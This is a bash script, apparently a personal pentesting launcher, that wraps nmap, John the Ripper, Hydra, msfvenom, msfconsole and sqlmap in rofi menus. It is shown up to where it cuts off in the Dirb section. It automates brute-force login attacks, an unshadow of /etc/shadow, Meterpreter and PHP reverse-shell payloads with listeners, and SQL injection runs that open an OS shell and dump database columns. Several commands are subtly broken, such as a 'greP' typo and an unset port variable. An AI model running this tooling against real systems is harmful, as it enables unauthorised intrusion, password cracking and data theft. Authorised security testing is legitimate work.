#!/bin/bash
while true; do
	interface=$(ifconfig | cut -d ":" -f 1 | cut -d " " -f 1 | sed '/^$/d' | grep -v 'lo' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which interface do you want to use?" )
	myip=$(ifconfig "$interface" | grep -win 'inet' | cut -d " " -f 10)
	range=$(ifconfig "$interface" | grep -win 'inet' | cut -d " " -f 10 | cut -d "." -f 1-3 | tr -d '\n' && echo ".0/24")
	while true; do
		UserQuestion=$(echo -e  "Yes\nNo" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Would you like to use same list of IP Addresses?")
		if [[ $UserQuestion == "No" ]]; then
				
			whosup=$(nmap -sn -T5 -min-parallelism 100 "$range" | grep -v -E 'Host|done|Starting' | cut -d " " -f 5 | grep -vxF "$myip" | sed '/^$/d' | tee ip.txt )
			scan=$(echo "$whosup" | tr " " "\n" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What IP would you like to use?")
			
		elif [[ $UserQuestion == "Yes" ]]; then
			scan=$(cat ip.txt | tr " " "\n" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What IP would you like to use?")

		fi

		while true; do
			syntax=$(echo -e "1.  Nmap\n2.  Password Cracking\n3.  Reverse Shell\n4.  SQLMap\n5.  Dirb\n6.  Windows Shares/Null Sessions\n7.  Change Target IP\n8.  Change Selected Interface\n9.  Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What Program are you interested in?"| cut -d '.' -f 1)

			if [[ $syntax == "1" ]]; then
				
				while true; do
					nmapscan=$(echo -e  "1. Stealth Scan              | nmap -T1 -sS <IP> \n2. Quick Scan                | nmap -sC -sV <IP>\n3. Full Scan                 | nmap -sC -sV -p- <IP>\n4. UDP Quick Scan            | nmap -sU -sV <IP>\n5. Full Scan+                | nmap -sV -n -v -Pn -p- -T4 -A <IP>\n6. Is Someone Listening?     | nmap -sV --script=sniffer-detect <IP>\n7. Port Knocker              | nmap -Pn --host-timeout 100 --max-retries 0 -p <PORT> <IP> \n8. Back\n9. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What type of nmap scan would you like to use?" | cut -d '.' -f 1)
					
					if [[ $nmapscan == "1" ]]; then
						sudo mkdir -p "NmapScans/$scan/StealthScan"
						sudo nmap -T1 -sS "$scan" -oX  "NmapScans/$scan/StealthScan/$scan.xml"
						sudo xsltproc "NmapScans/$scan/StealthScan/$scan.xml" -o "NmapScans/$scan/StealthScan/$scan.html"
						sudo rm -f "NmapScans/$scan/StealthScan/$scan.xml"

					elif [[ $nmapscan == "2" ]]; then
						sudo mkdir -p "NmapScans/$scan/QuickScan"
						sudo nmap -sC -sV "$scan" -oX  "NmapScans/$scan/QuickScan/$scan.xml"
						sudo xsltproc "NmapScans/$scan/QuickScan/$scan.xml" -o "NmapScans/$scan/QuickScan/$scan.html"
						sudo rm -f "NmapScans/$scan/QuickScan/$scan.xml"
					
					elif [[ $nmapscan == "3" ]]; then
						sudo mkdir -p "NmapScans/$scan/FullScan"
						sudo nmap -sC -sV -p- "$scan" -oX  "NmapScans/$scan/FullScan/$scan.xml"
						sudo xsltproc "NmapScans/$scan/FullScan/$scan.xml" -o "NmapScans/$scan/FullScan/$scan.html"
						sudo rm -f "NmapScans/$scan/FullScan/$scan.xml"

					elif [[ $nmapscan == "4" ]]; then
						sudo mkdir -p "NmapScans/$scan/QuickUDP"
						sudo nmap -sU -sV "$scan" -oX  "NmapScans/$scan/QuickUDP/$scan.xml"
						sudo xsltproc "NmapScans/$scan/QuickUDP/$scan.xml" -o "NmapScans/$scan/QuickUDP/$scan.html"
						sudo rm -f "NmapScans/$scan/QuickUDP/$scan.xml"

					elif [[ $nmapscan == "5" ]]; then
						sudo mkdir -p "NmapScans/$scan/FullScan+"
						sudo nmap -sV -n -v -Pn -p- -T4 -A "$scan" -oX "NmapScans/$scan/FullScan+/$scan.xml"
						sudo xsltproc "NmapScans/$scan/FullScan+/$scan.xml" -o "NmapScans/$scan/FullScan+/$scan.html"
						sudo rm -f "NmapScans/$scan/FullScan+/$scan.xml"

					elif [[ $nmapscan == "6" ]]; then
						sudo mkdir -p "NmapScans/$scan/SomeoneListening"
						sudo nmap -sV --script=sniffer-detect "$scan"
					
					elif [[ $nmapscan == "7" ]]; then
						port=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Port Number

						");

						sudo nmap -Pn --host-timeout 100 --max-retries 0 -p "$port" "$scan" 


					elif [[ $nmapscan == "8" ]]; then
						break
					elif [[ $nmapscan == "9" ]]; then
						exit   
					fi


				done


			elif [[ $syntax == "2" ]]; then
				while true; do
					passcracker=$(echo -e "1. John\n2. Hydra\n3. Back\n4. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which password cracking tool would you like to use?" | cut -d '.' -f 1)
					if [[ $passcracker == "1" ]]; then
						while true; do
							userlist=$(find /usr/share/ncrack/* /usr/share/seclists/Usernames/* -name '*.txt' -o -name '*.usr' | sort |rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Username List would you like to use?")
							passlist=$(find /usr/share/ncrack/* /usr/share/seclists/Passwords/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
							while true; do
								john=$(echo -e  "1.  Encryption Formats      | john --list=formats\n2.  Unshadow                | unshadow /etc/passwd /etc/shadow > hashes.txt \n3.  Brute Force Users List  | john -incremental -users:<file.usr> -wordlist=<pass.txt>\n4.  Brute Force Single User | john -incremental -users:<victim>\n5.  Show Cracked Passwords  | john --show hashes.txt\n6.  Dictionary Attack       | john -wordlist=<pass.txt> hashes.txt\n7.  Default Wordlist        | john -wordlist -users=<victim> hashes.txt\n8.  Mangled Rules           | john -wordlist=<pass.txt> -rules hashes.txt\n9.  Crack Cisco Secret 5    | john --format=md5crypt --fork=4 -wordlist=<pass.txt> hashes.txt\n10. Change User & Pass List \n11. Back\n12. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which John The Ripper Attack would you like to use?" | cut -d '.' -f 1)
								
								if [[ $john == "1" ]]; then
									sudo john --list=formats
								elif [[ $john == "2" ]]; then
									sudo unshadow /etc/passwd /etc/shadow > hashes.txt
								elif [[ $john == "3" ]]; then
									sudo john -incremental -users:"$userlist" -wordlist="$passlist"
								elif [[ $john == "4" ]]; then
									
									victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2


								");
									sudo john -incremental -users:"$victim"
								elif [[ $john == "5" ]]; then
									sudo john --show hashes.txt
								elif [[ $john == "6" ]]; then
									sudo john -wordlist="$passlist" hashes.txt
								elif [[ $john == "7" ]]; then
									victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2


								");
							
									sudo john -wordlist -users="$victim" hashes.txt
								elif [[ $john == "8" ]]; then
									sudo john -wordlist="$passlist" -rules hashes.txt
								elif [[ $john == "9" ]]; then
									sudo john --format=md5crypt --fork=4 -wordlist="$passlist" hashes.txt
								elif [[ $john == "10" ]]; then
									break	
								elif [[ $john == "11" ]]; then
									break 2
								elif [[ $john == "12" ]]; then
									exit   
								fi
							done
						done

					elif [[ $passcracker == "2" ]]; then
						while true; do	
							userlist=$(find /usr/share/ncrack/* /usr/share/seclists/Usernames/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Username List would you like to use?")
							passlist=$(find /usr/share/ncrack/* /usr/share/seclists/Passwords/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use
							");
							##port=$(sudo nmap -T5 -min-parallelism 100 -p- $scan | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d'| rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What port would you like to use?" | cut -d '.' -f 1)

							while true; do	
								hydra=$(echo -e  "1. Telnet Crack             | hydra -L <list.usr> -P <pass.txt> telnet://<IP>\n2. HTTP Basic Auth Attack   | hydra -L <list.usr> -P <pass.txt> http-get://<IP>\n3. SSH Crack 2              | hydra <IP> ssh -s22 -L <list.usr> -P <pass.txt> -f -V\n4. Login Crack              | hydra <site.com> http-post-form '<login.php>:<usr>=^USER^&<pwd>=^PASS^:S=logout' -L <list.usr> -P <pass.txt> -f -V\n5. PoP3 Crack               | hydra -l <USER> -P <pass.txt> -t20 <IP> -s<PORT> -I pop3\n6. Change User & Pass List\n7. Back\n8. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Hydra Attack would you like to use?" | cut -d '.' -f 1)

								if [[ $hydra == "1" ]]; then
									echo -e "sudo hydra -L $userlist -P $passlist telnet://$scan\n"
									sudo hydra -L "$userlist" -P "$passlist" -s"$port" telnet://"$scan"
								
								elif [[ $hydra == "2" ]]; then
									url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste your URL

									");

									echo -e "sudo hydra -L $userlist -P $passlist http-get://$url\n"
									sudo hydra -L "$userlist" -P -s"$port" "$passlist" http-get://"$url"
								
								elif [[ $hydra == "3" ]]; then
									echo -e "sudo hydra $scan ssh -L $userlist -P $passlist -f -V\n"
									sudo hydra "$scan" ssh -s22 -L "$userlist" -P "$passlist" -f -V
								
								elif [[ $hydra == "4" ]]; then

									url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste your URL

									");
									rname=$(echo "$url" | cut -d "/" -f 3);
									fpath=$(echo "$url" | cut -d "/" -f 4-99);
									usrfield=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Inspect Element username field =


						");
									passfield=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Inspect Element password field =


						");




									echo -e "sudo hydra $rname http-post-form '$fpath:$usrfield=^USER^&$passfield=^PASS^:S=logout' -L $user -P $passlist -f -V\n"
									sudo hydra "$rname" http-post-form '$fpath:$usrfield=^USER^&$passfield=^PASS^:S=logout' -L "$user" -P "$passlist" -f -V

								elif [[ $hydra == "5" ]]; then
									
									UserQuestion=$(echo -e  "Yes\nNo" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Do you know the Username?")
									if [[ $UserQuestion == "Yes" ]]; then 
										user=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Username


						");



										echo -e "sudo hydra -l $user -P $passlist -t20 $scan -s$port -I pop3\n"
										sudo hydra -l "$user" -P "$passlist" -t20 "$scan" -s"$port" -I pop3

									elif [[ $UserQuestion == "No" ]]; then 

										echo -e "sudo hydra -L $userlist-P $passlist -t20 $scan -s$port -I pop3\n"
										sudo hydra -L "$userlist" -P "$passlist" -t20 "$scan" -s"$port" -I pop3



									fi
									
								elif [[ $hydra == "6" ]]; then
									break
								elif [[ $hydra == "7" ]]; then
									break 2
								elif [[ $hydra == "8" ]]; then
									exit   

									
						
							fi
							done
						done	
					elif [[ $passcracker == "3" ]]; then
						break
					elif [[ $passcracker == "4" ]]; then
						exit   


					fi

				done	
			elif [[ $syntax == "3" ]]; then
				while true; do
					reverseshell=$(echo -e "1. PHP Reverse Shell\n2. Linux Reverse Shell\n3. Tomcat Reverse Shell\n4. Back\n5. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Reverse Shell would you like to use?" | cut -d '.' -f 1)
					##PHP Reverse Shell
					if [[ $reverseshell == "1" ]]; then
						port=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Port Number


						");
						echo "msfvenom -p php/reverse_php lhost=$myip lport=$port -o shell.php"
						msfvenom -p php/reverse_php lhost="$myip" lport="$port" -o shell.php
						sleep 3
						echo 'msfconsole -q -x "use exploit/multi/handler; set LHOST $myip; set LPORT $port; set payload php/reverse_php; run; exit -y"'
						msfconsole -q -x "use exploit/multi/handler; set LHOST $myip; set LPORT $port; set payload php/reverse_php; run; exit -y"
					
					##Linux Reverse Shell
					elif [[ $reverseshell == "2" ]]; then
						port=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Port Number


						");
						echo "msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=$myip lport=$port -f elf -o shell" 
						msfvenom -p linux/x64/meterpreter_reverse_tcp lhost="$myip" lport="$port" -f elf -o shell  
						sleep 3
						echo 'msfconsole -q -x "use exploit/multi/handler; set LHOST $myip; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"'
						msfconsole -q -x "use exploit/multi/handler; set LHOST $myip; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
					
					##Tomcat Reverse Shell
					elif [[ $reverseshell == "3" ]]; then
						port=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Port Number


						");
						echo "msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=$myip lport=$port -f elf -o shell.war;"
						msfvenom -p linux/x64/meterpreter_reverse_tcp lhost="$myip" lport="$port" -f elf -o shell.war 
						sleep 3
						echo 'msfconsole -q -x "use exploit/multi/handler; set LHOST $myip; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"'
						msfconsole -q -x "use exploit/multi/handler; set LHOST $myip; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
					
					##Back
					elif [[ $reverseshell == "4" ]]; then
						break
					
					##Exit
					elif [[ $reverseshell == "5" ]]; then
						exit


					fi
				done



			elif [[ "$syntax" == "4" ]]; then
				while true; do
					sqlmaps=$(echo -e "1.  Interactive Shell\n2.  Get Request\n3.  Post Request\n4.  Banner Grab\n5.  Payloads Used\n6.  Find Users\n7.  Show Databases\n8.  Show Tables\n9.  Show Columns\n10. Dump Database\n11. Burp Output(NOT WORKING)\n12. Back\n13. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
					
					##Interactive Shell
					if [[ $sqlmaps == "1" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");

						sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --os-shell


					##Get Request	
					elif [[ $sqlmaps == "2" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap --keep-alive --answers="follow=y" --batch  -u "$url" -p "$id" --technique=U

						else
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms

						fi

					##Post Request	
					elif [[ $sqlmaps == "3" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --data=POSTstring -p "$id"
						
						else
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --data=POSTstring 

						fi

					##Banner Grab	
					elif [[ $sqlmaps == "4" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U --banner
					
						else
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --banner

						fi
						
					##Payloads Used
					elif [[ $sqlmaps == "5" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U --banner -v3 --fresh-queries
						
						else
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --banner -v3 --fresh-queries

						fi


					##Find Users
					elif [[ $sqlmaps == "6" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -users

						else
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -users

						fi
					
					
					##Show Database
					elif [[ $sqlmaps == "7" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							sudo mkdir -p "SqlMap/$scan/"
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs 2>&1 | tee ./SqlMap/"$scan"/Databases.txt
							cat ./SqlMap/"$scan"/Databases.txt | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | tee ./SqlMap/"$scan"/Databases.txt
							xargs -I {} mkdir -p ./SqlMap/"$scan"/"{}" < ./SqlMap/"$scan"/Databases.txt		
			
						else
							sudo mkdir -p "SqlMap/$scan/"
							sqlmap -o --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs 2>&1 | tee ./SqlMap/"$scan"/Databases.txt
							cat ./SqlMap/"$scan"/Databases.txt | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | tee ./SqlMap/"$scan"/Databases.txt
							xargs -I {} mkdir -p ./SqlMap/"$scan"/"{}" < ./SqlMap/"$scan"/Databases.txt		
						fi
					
					
					##Show Tables
					elif [[ $sqlmaps == "8" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
	
						if grep -q "$index" <<< "$url"; then
							if [ -f "./SqlMap/$scan/Databases.txt" ]; then
								echo "file was FOUND"
								id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
								db=$(cat ./SqlMap/"$scan"/Databases.txt | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 

				");
								sudo mkdir -p "SqlMap/$scan/$db"
								sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables 2>&1 | tee ./SqlMap/"$scan"/"$db"/Tables.txt
								cat ./SqlMap/"$scan"/"$db"/Tables.txt | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | tee ./SqlMap/"$scan"/"$db"/Tables.txt
								xargs -I {} mkdir -p ./SqlMap/"$scan"/"$db"/"{}" < ./SqlMap/"$scan"/"$db"/Tables.txt	


							else

								id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
								db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 

				");

								sudo mkdir -p "SqlMap/$scan/$db"
								sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables 2>&1 | tee ./SqlMap/"$scan"/"$db"/Tables.txt
								cat ./SqlMap/"$scan"/"$db"/Tables.txt | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | tee ./SqlMap/"$scan"/"$db"/Tables.txt
								xargs -I {} mkdir -p ./SqlMap/"$scan"/"$db"/"{}" < ./SqlMap/"$scan"/"$db"/Tables.txt
							fi
			
						else
							if [ -f "./SqlMap/$scan/Databases.txt" ]; then
								db=$(cat ./SqlMap/"$scan"/Databases.txt  | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 

				");

								sudo mkdir -p "SqlMap/$scan/$db"
								sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables 2>&1 | tee ./SqlMap/"$scan"/"$db"/Tables.txt
								cat ./SqlMap/"$scan"/"$db"/Tables.txt | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | tee ./SqlMap/"$scan"/"$db"/Tables.txt
								xargs -I {} mkdir -p ./SqlMap/"$scan"/"$db"/"{}" < ./SqlMap/"$scan"/"$db"/Tables.txt	
							
							
							else
								db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 

				");
							
								sudo mkdir -p "SqlMap/$scan/$db"
								sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables 2>&1 | tee ./SqlMap/"$scan"/"$db"/Tables.txt
								cat ./SqlMap/"$scan"/"$db"/Tables.txt | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | tee ./SqlMap/"$scan"/"$db"/Tables.txt	 
								xargs -I {} mkdir -p ./SqlMap/"$scan"/"$db"/"{}" < ./SqlMap/"$scan"/"$db"/Tables.txt	
							
							fi

						fi

					##Show Columns
					elif [[ $sqlmaps == "9" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
	
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

						");
							
							Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table
										
						");
							sudo mkdir -p "SqlMap/$scan/$db/$Tables"
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -columns 2>&1 | tee ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt
							cat ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2 | tee ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt	
							xargs -I {} mkdir -p ./SqlMap/"$scan"/"$db"/"$Tables"/"{}" < ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt	
						else
							db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

						");

							Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table
										
						");
							sudo mkdir -p "SqlMap/$scan/$db/$Tables"
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" -columns 2>&1 | tee ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt
							cat ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2 | tee ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt	
							xargs -I {} mkdir -p ./SqlMap/"$scan"/"$db"/"$Tables"/"{}" < ./SqlMap/"$scan"/"$db"/"$Tables"/Columns.txt	


						fi
						
					##Dump Databases
					elif [[ $sqlmaps == "10" ]]; then
						url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
	
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1) 
							db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

						");

							Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table	
										
						");


							Columns=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)
						
							echo "$Columns"
							sleep 1

							Data=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump

						
$Columns	


						");

							sudo mkdir -p "SqlMap/$scan/$db/$Tables/$Columns"
							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -C "$Data" --dump | tee ./SqlMap/"$scan"/"$db"/"$Tables"/DataDump.txt

							
						else
							db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

						");

							Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table	
										
						");


							Columns=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)
						
							echo "$Columns"
							sleep 1

							Data=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump:

						
$Columns	


						");


							sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" -C "$Data" --dump | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | tee ./SqlMap/"$scan"/"$db"/"$Tables"/DataDump.txt



						fi
				
					##Burp Output (NOT WORKING)
					elif [[ $sqlmaps == "11" ]]; then
						file=$(find ./* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Choose the file you want to use: This should be file you made from a burp output page")
						sqlmap --keep-alive --answers="follow=y" --batch -r "$file" — dbs — level 3

					##BACK
					elif [[ $sqlmaps == "12" ]]; then
						break
					##EXIT
					elif [[ $sqlmaps == "13" ]]; then
						exit
					fi
				done

			#DIRB
			elif [[ $syntax == "5" ]]; then
				while true; do
					url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


					");

